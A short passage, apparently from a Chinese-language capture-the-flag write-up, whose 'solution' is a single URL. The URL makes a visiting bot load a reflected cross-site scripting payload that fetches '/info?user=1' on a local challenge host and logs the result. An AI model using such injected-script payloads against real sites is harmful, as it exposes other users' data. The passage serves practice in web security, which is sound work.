...
解决办法:<br>
```
http://challenge.localhost/visit?url=http://challenge.localhost:80/echo?echo=%3Cscript%3Efetch(%27/info%3fuser=1%27).then(response%20=%3E%20response.json()).then(data%20=%3E%20console.log(data));%3C/script%3E
